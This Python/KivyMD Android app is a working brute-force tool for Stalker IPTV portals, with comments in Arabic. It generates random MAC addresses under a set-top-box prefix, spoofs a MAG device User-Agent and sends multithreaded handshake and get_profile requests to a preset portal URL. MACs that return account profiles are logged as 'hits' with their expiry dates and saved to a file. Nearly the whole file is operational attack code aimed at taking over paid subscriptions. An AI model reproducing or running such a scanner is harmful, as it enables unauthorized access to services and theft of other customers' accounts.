"""
Professional Stalker Middleware MAC Scanner PRO (Unified Master Engine v11.0)
Fully Restored: Premium UI v7.0 Layout
Fully Integrated: Direct-Storage Pipeline v9.0 + Expiry Date Extraction
"""

from kivymd.app import MDApp
from kivymd.uix.screen import MDScreen
from kivymd.uix.bottomnavigation import MDBottomNavigation, MDBottomNavigationItem
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.card import MDCard
from kivymd.uix.label import MDLabel
from kivymd.uix.button import MDRaisedButton
from kivymd.uix.textfield import MDTextField
from kivymd.uix.progressbar import MDProgressBar
from kivymd.uix.scrollview import MDScrollView
from kivy.lang import Builder
from kivy.clock import Clock
from kivy.properties import StringProperty, NumericProperty, BooleanProperty, ListProperty
from kivy.utils import get_color_from_hex
from kivy.core.clipboard import Clipboard

import threading
import requests
import time
import datetime
import re
import os
import random
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 🌟 المسار الأبسط والأضمن في أندرويد لعدم ضياع أي ملف
SAVE_PATH = "/storage/emulated/0/Download/stalker_hits.txt"

# ─────────────────────────────────────────────
#  KV Layout Design (واجهتك الاحترافية كاملة بدون أي نقصان)
# ─────────────────────────────────────────────
KV = """
#:import dp kivy.metrics.dp
#:import get_color_from_hex kivy.utils.get_color_from_hex

<StatCard>:
    size_hint_y: None
    height: dp(90)
    orientation: "vertical"
    padding: dp(10)
    radius: [14]
    elevation: 2
    md_bg_color: app.theme_cls.bg_dark

    MDLabel:
        text: root.value
        halign: "center"
        bold: True
        font_style: "H5"
        theme_text_color: "Custom"
        text_color: root.accent_color

    MDLabel:
        text: root.title
        halign: "center"
        font_style: "Caption"
        theme_text_color: "Secondary"


<LogLine>:
    size_hint_y: None
    height: self.minimum_height
    padding: [dp(4), dp(1)]

    MDLabel:
        text: root.text
        markup: True
        font_style: "Body2"
        size_hint_y: None
        height: self.texture_size[1]
        theme_text_color: "Custom"
        text_color: root.line_color


<DashboardScreen>:
    name: "dashboard"

    MDBoxLayout:
        orientation: "vertical"

        MDTopAppBar:
            title: "IPTV MAC Scanner PRO v11.0"
            md_bg_color: app.theme_cls.primary_color

        MDScrollView:
            do_scroll_x: False

            MDBoxLayout:
                orientation: "vertical"
                spacing: dp(12)
                padding: dp(12)
                size_hint_y: None
                height: self.minimum_height

                MDBoxLayout:
                    spacing: dp(10)
                    size_hint_y: None
                    height: dp(90)

                    StatCard:
                        title: "TOTAL"
                        value: root.total_requests
                        accent_color: app.theme_cls.primary_light

                    StatCard:
                        title: "VERIFIED HITS"
                        value: root.success_hits
                        accent_color: get_color_from_hex("#00E676")

                    StatCard:
                        title: "ERRORS"
                        value: root.errors
                        accent_color: get_color_from_hex("#FF5252")

                MDCard:
                    orientation: "vertical"
                    padding: dp(14)
                    spacing: dp(14)
                    size_hint_y: None
                    height: self.minimum_height
                    radius: [14]
                    elevation: 2
                    md_bg_color: app.theme_cls.bg_dark

                    MDLabel:
                        text: "RANDOM STALKER PROTOCOL SETUP"
                        bold: True
                        size_hint_y: None
                        height: dp(25)

                    MDTextField:
                        id: target_url
                        hint_text: "Portal URL"
                        text: "http://torrent.iptvstream.net:80/"
                        mode: "rectangle"

                    MDTextField:
                        id: mac_prefix
                        hint_text: "MAC Prefix"
                        text: "00:1A:79"
                        mode: "rectangle"

                    MDBoxLayout:
                        spacing: dp(10)
                        size_hint_y: None
                        height: self.minimum_height

                        MDTextField:
                            id: hex_start
                            hint_text: "Hex Start"
                            text: "000000"
                            mode: "rectangle"
                            disabled: True

                        MDTextField:
                            id: hex_end
                            hint_text: "Hex End"
                            text: "FFFFFF"
                            mode: "rectangle"
                            disabled: True

                    MDBoxLayout:
                        spacing: dp(10)
                        size_hint_y: None
                        height: self.minimum_height

                        MDTextField:
                            id: threads
                            hint_text: "THREADS"
                            text: "30"
                            mode: "rectangle"
                            input_filter: "int"

                        MDTextField:
                            id: timeout
                            hint_text: "TIMEOUT"
                            text: "4.0"
                            mode: "rectangle"
                            input_filter: "float"

                MDCard:
                    orientation: "vertical"
                    padding: dp(12)
                    spacing: dp(8)
                    size_hint_y: None
                    height: dp(95)
                    radius: [14]
                    elevation: 2
                    md_bg_color: app.theme_cls.bg_dark

                    MDLabel:
                        text: root.status
                        bold: True
                        font_style: "Body1"

                    MDProgressBar:
                        id: progress_bar
                        value: root.progress
                        color: app.theme_cls.primary_color

                    MDLabel:
                        text: root.progress_text
                        halign: "right"
                        font_style: "Caption"

                MDBoxLayout:
                    spacing: dp(10)
                    size_hint_y: None
                    height: dp(52)

                    MDRaisedButton:
                        id: btn_start
                        text: "START ENGINE"
                        md_bg_color: get_color_from_hex("#00897B")
                        on_release: root.start_scan()

                    MDRaisedButton:
                        id: btn_stop
                        text: "STOP ENGINE"
                        md_bg_color: get_color_from_hex("#B71C1C")
                        on_release: root.stop_scan()
                        disabled: True

                    MDRaisedButton:
                        text: "CLEAR LOGS"
                        md_bg_color: get_color_from_hex("#5D6266")
                        on_release: root.clear_logs()

                MDCard:
                    orientation: "vertical"
                    radius: [14]
                    padding: dp(8)
                    md_bg_color: get_color_from_hex("#0D1117")
                    size_hint_y: None
                    height: dp(220)

                    MDBoxLayout:
                        orientation: "horizontal"
                        size_hint_y: None
                        height: dp(26)

                        MDLabel:
                            text: "STALKER LIVE CONSOLE LOG"
                            bold: True
                            theme_text_color: "Custom"
                            text_color: get_color_from_hex("#8B949E")

                    MDScrollView:
                        id: log_scroll
                        do_scroll_x: False
                        MDBoxLayout:
                            id: log_container
                            orientation: "vertical"
                            size_hint_y: None
                            height: self.minimum_height
                            spacing: dp(1)


<SettingsScreen>:
    name: "settings"

    MDBoxLayout:
        orientation: "vertical"

        MDTopAppBar:
            title: "Captured HITS (Text Viewer)"
            md_bg_color: app.theme_cls.primary_color
            right_action_items: [["content-copy", lambda x: root.copy_all_hits()], ["refresh", lambda x: root.load_hits_from_file()], ["delete-sweep", lambda x: root.clear_hits_file()]]

        MDScrollView:
            do_scroll_x: False
            padding: dp(12)
            
            MDBoxLayout:
                orientation: "vertical"
                size_hint_y: None
                height: self.minimum_height
                padding: dp(10)
                
                MDLabel:
                    id: text_viewer_label
                    text: "No HITS captured yet."
                    font_style: "Body2"
                    size_hint_y: None
                    height: self.texture_size[1]
                    markup: True
                    theme_text_color: "Custom"
                    text_color: get_color_from_hex("#E1E4E8")
"""

class StatCard(MDCard):
    title = StringProperty("")
    value = StringProperty("0")
    accent_color = ListProperty([1, 1, 1, 1])

class LogLine(MDBoxLayout):
    text = StringProperty("")
    line_color = ListProperty([0.8, 0.8, 0.8, 1])

class DashboardScreen(MDScreen):
    total_requests = StringProperty("0")
    success_hits = StringProperty("0")
    errors = StringProperty("0")
    progress = NumericProperty(0)
    progress_text = StringProperty("0 / 0 (0%)")
    status = StringProperty("* STATUS: READY")
    running = BooleanProperty(False)

    MAX_LOG_ITEMS = 20

    def start_scan(self):
        if self.running: return
        self.running = True
        self.status = "[>] STATUS: ENGINE RUNNING"
        self.ids.btn_start.disabled = True
        self.ids.btn_stop.disabled = False
        self.ids.log_container.clear_widgets()

        self.total = 0
        self.hits = 0
        self.errors_count = 0
        self._batch_size = 16777216

        self.thread_count = int(self.ids.threads.text or 30)
        self.timeout_val = float(self.ids.timeout.text or 4.0)

        self.add_log_to_ui("Core", f"Direct Engine Active. Path: {SAVE_PATH}", "info")
        threading.Thread(target=self.run_scanner_engine, daemon=True).start()

    def stop_scan(self):
        self.running = False
        self.status = "[-] STATUS: STOPPED"
        self.ids.btn_start.disabled = False
        self.ids.btn_stop.disabled = True
        self.add_log_to_ui("Core", "Engine Suspended. File Saved Safely.", "warn")

    def run_scanner_engine(self):
        base_url = self.ids.target_url.text.strip()
        portal = f"{base_url if base_url.endswith('/') else base_url + '/'}portal.php"
        prefix = self.ids.mac_prefix.text.strip()
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
            'X-User-Agent': 'Model: MAG270; Link: WiFi',
            'Connection': 'Keep-Alive'
        }
        session = requests.Session()

        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
            while self.running:
                suffix = f"{random.randint(0, 16777215):06X}"
                mac = ":".join([prefix] + [suffix[i:i+2] for i in range(0, 6, 2)])
                executor.submit(self.check_single_mag, session, portal, mac, headers)
                time.sleep(0.01)

    def check_single_mag(self, session, portal, mac, headers):
        if not self.running: return
        cookies = {'mac': mac, 'mac_w': mac}
        try:
            self.total += 1
            res1 = session.get(f"{portal}?type=stb&action=handshake", cookies=cookies, headers=headers, timeout=self.timeout_val, verify=False)
            
            if '"token"' in res1.text.lower():
                res2 = session.get(f"{portal}?type=stb&action=get_profile", cookies=cookies, headers=headers, timeout=self.timeout_val, verify=False)
                
                if res2.status_code == 200 and ("parent_password" in res2.text.lower() or "expiry" in res2.text.lower()):
                    self.hits += 1
                    
                    # 🔍 استخراج تاريخ الانتهاء من الـ profile info بشكل ذكي وتلقائي
                    expiry_date = "Unlimited/Active"
                    match = re.search(r'"expiry"\s*:\s*"([^"]+)"', res2.text, re.IGNORECASE)
                    if match:
                        expiry_date = match.group(1).strip()
                    else:
                        # محاولة ثانية في حال كان مسمى الحقل مختلفاً في بعض البورتالات
                        match2 = re.search(r'"end_date"\s*:\s*"([^"]+)"', res2.text, re.IGNORECASE)
                        if match2: expiry_date = match2.group(1).strip()
                    
                    # 🌟 حفظ فوري بداخل الـ Thread مع حقل تاريخ الانتهاء المستخرج
                    with open(SAVE_PATH, "a") as f:
                        f.write(f"HIT: {mac} | Exp: {expiry_date} | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    
                    Clock.schedule_once(lambda dt: self.update_ui_counters(mac, f"HIT|{expiry_date}"))
                else:
                    if self.total % 40 == 0:
                        Clock.schedule_once(lambda dt: self.update_ui_counters(mac, "SCAN"))
            else:
                if self.total % 40 == 0:
                    Clock.schedule_once(lambda dt: self.update_ui_counters(mac, "SCAN"))
        except:
            self.errors_count += 1
            if self.total % 20 == 0:
                Clock.schedule_once(lambda dt: self.update_ui_counters(mac, "ERROR"))

    def update_ui_counters(self, mac, mode):
        self.total_requests = str(self.total)
        self.success_hits = str(self.hits)
        self.errors = str(self.errors_count)
        
        # تحديث شريط التقدم للبرنامج
        pct = min(int((self.total / self._batch_size) * 100), 100)
        self.progress = pct
        self.progress_text = f"{self.total} / {self._batch_size}"

        # طباعة السجلات الحية داخل الكونسول
        if mode.startswith("HIT"):
            exp = mode.split("|")[1]
            self.add_log_to_ui("REAL_HIT", f"{mac} -> Exp: {exp}", "success")
        elif mode == "ERROR" and self.running:
            self.add_log_to_ui("ERR", "Gateway Block / Timeout", "error")
        elif mode == "SCAN" and self.running:
            self.add_log_to_ui("SCAN", mac, "dim")

    COLOR_MAP = {
        "success": get_color_from_hex("#00E676"), "error": get_color_from_hex("#FF5252"),
        "warn": get_color_from_hex("#FFD740"), "info": get_color_from_hex("#82AAFF"),
        "dim": get_color_from_hex("#4F5661"),
    }

    def add_log_to_ui(self, tag, message, level="info"):
        color = self.COLOR_MAP.get(level, self.COLOR_MAP["info"])
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        line = LogLine()
        line.text = f"[color=#4F5661]{ts}[/color]  [{tag}] | {message}"
        line.line_color = color
        self.ids.log_container.add_widget(line)
        if len(self.ids.log_container.children) > self.MAX_LOG_ITEMS:
            self.ids.log_container.remove_widget(self.ids.log_container.children[-1])
        Clock.schedule_once(lambda dt: setattr(self.ids.log_scroll, "scroll_y", 0), 0.01)

    def clear_logs(self):
        self.ids.log_container.clear_widgets()


# ─────────────────────────────────────────────
#  Settings / History Screen Logic (صفحة عرض الهستوري الكاملة)
# ─────────────────────────────────────────────
class SettingsScreen(MDScreen):
    def on_enter(self):
        self.load_hits_from_file()

    def load_hits_from_file(self):
        viewer = self.ids.text_viewer_label
        if not os.path.exists(SAVE_PATH):
            viewer.text = "No HITS captured yet."
            return

        try:
            with open(SAVE_PATH, "r") as f:
                content = f.read().strip()
            if not content:
                viewer.text = "No HITS captured yet."
                return

            styled_text = ""
            lines = content.split("\n")
            for line in reversed(lines):  
                if line.strip():
                    line = line.replace("HIT:", "[color=#00E676]HIT:[/color]")
                    line = line.replace("|", "[color=#4F5661]|[/color]")
                    styled_text += f"{line}\n\n"
            viewer.text = styled_text
        except Exception as e:
            viewer.text = f"Error reading storage file: {str(e)}"

    def copy_all_hits(self):
        if os.path.exists(SAVE_PATH):
            try:
                with open(SAVE_PATH, "r") as f:
                    content = f.read().strip()
                if content: Clipboard.copy(content)
            except: pass

    def clear_hits_file(self):
        try:
            if os.path.exists(SAVE_PATH): os.remove(SAVE_PATH)
            self.load_hits_from_file()
        except: pass


class MainApp(MDApp):
    def build(self):
        self.theme_cls.primary_palette = "Teal"
        self.theme_cls.theme_style = "Dark"
        Builder.load_string(KV)
        nav = MDBottomNavigation()
        dash = DashboardScreen()
        settings = SettingsScreen()
        
        tab1 = MDBottomNavigationItem(name="scanner", text="Scanner", icon="radar")
        tab1.add_widget(dash)
        tab2 = MDBottomNavigationItem(name="history", text="History", icon="history")
        tab2.add_widget(settings)
        
        nav.add_widget(tab1)
        nav.add_widget(tab2)
        return nav

if __name__ == "__main__":
    MainApp().run()
